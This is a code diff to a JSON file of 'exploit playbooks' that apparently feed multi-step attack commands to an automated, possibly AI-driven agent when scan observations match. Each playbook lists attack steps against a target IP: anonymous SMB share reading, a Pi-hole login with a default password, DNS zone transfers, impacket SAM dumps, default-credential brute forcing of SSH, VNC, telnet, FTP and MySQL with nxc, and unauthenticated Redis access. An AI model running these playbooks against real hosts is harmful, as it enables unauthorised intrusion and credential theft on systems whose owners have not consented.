@@ -1,13 +1,14 @@
 {
   "_meta": {
-    "description": "Exploit playbooks — multi-step attack sequences triggered by host memory observations",
-    "usage": "When a trigger matches host memory, the steps are fed sequentially via multi-turn mode"
+    "description": "Exploit playbooks — multi-step attack sequences",
+    "repeatable": "false = one-and-done (enumeration/recon), true = can retry (cred attacks)"
   },
   "playbooks": [
     {
       "id": "smb_share_read",
       "trigger_obs": "shares accessible",
       "trigger_ports": [445, 139],
+      "repeatable": false,
       "desc": "Read contents of accessible SMB shares",
       "steps": [
         "smbclient -N //{ip}/{share} -c 'recurse ON; ls'",
@@ -19,6 +20,7 @@
       "id": "pihole_exploit",
       "trigger_obs": "Pi-hole",
       "trigger_ports": [80, 443],
+      "repeatable": false,
       "desc": "Exploit Pi-hole web interface",
       "steps": [
         "curl -s -X POST http://{ip}/admin/index.php -d 'pw=admin'",
@@ -31,6 +33,7 @@
       "id": "dns_zone_transfer",
       "trigger_obs": "DNS resolver",
       "trigger_ports": [53],
+      "repeatable": false,
       "desc": "Attempt DNS zone transfer and enumerate",
       "steps": [
         "dig axfr @{ip}",
@@ -42,6 +45,7 @@
       "id": "samba_deep",
       "trigger_obs": "Samba version",
       "trigger_ports": [445],
+      "repeatable": false,
       "desc": "Deep Samba enumeration after version detection",
       "steps": [
         "impacket-samrdump {ip}",
@@ -53,6 +57,7 @@
       "id": "http_deep",
       "trigger_obs": "HTTP server",
       "trigger_ports": [80, 8080, 8888, 443],
+      "repeatable": false,
       "desc": "Deep HTTP enumeration",
       "steps": [
         "curl -s http://{ip}/robots.txt",
@@ -65,6 +70,7 @@
       "id": "vnc_attack",
       "trigger_obs": "VNC",
       "trigger_ports": [5900, 5901],
+      "repeatable": true,
       "desc": "VNC password brute force",
       "steps": [
         "nxc vnc {ip} -p password",
@@ -77,6 +83,7 @@
       "id": "ssh_full_attack",
       "trigger_obs": "SSH:",
       "trigger_ports": [22],
+      "repeatable": true,
       "desc": "Full SSH credential attack",
       "steps": [
         "nxc ssh {ip} -u pi -p raspberry",
@@ -89,6 +96,7 @@
       "id": "telnet_attack",
       "trigger_obs": "telnet",
       "trigger_ports": [23],
+      "repeatable": true,
       "desc": "Telnet default credentials",
       "steps": [
         "nxc telnet {ip} -u admin -p admin",
@@ -100,6 +108,7 @@
       "id": "ftp_attack",
       "trigger_obs": "ftp",
       "trigger_ports": [21],
+      "repeatable": true,
       "desc": "FTP anonymous + default creds",
       "steps": [
         "nxc ftp {ip} -u anonymous -p anonymous",
@@ -110,6 +119,7 @@
       "id": "redis_attack",
       "trigger_obs": "redis",
       "trigger_ports": [6379],
+      "repeatable": false,
       "desc": "Redis unauthenticated access",
       "steps": [
         "redis-cli -h {ip} INFO",
@@ -120,6 +130,7 @@
       "id": "mysql_attack",
       "trigger_obs": "mysql",
       "trigger_ports": [3306],
+      "repeatable": true,
       "desc": "MySQL default creds",
       "steps": [
         "nxc mysql {ip} -u root -p root",
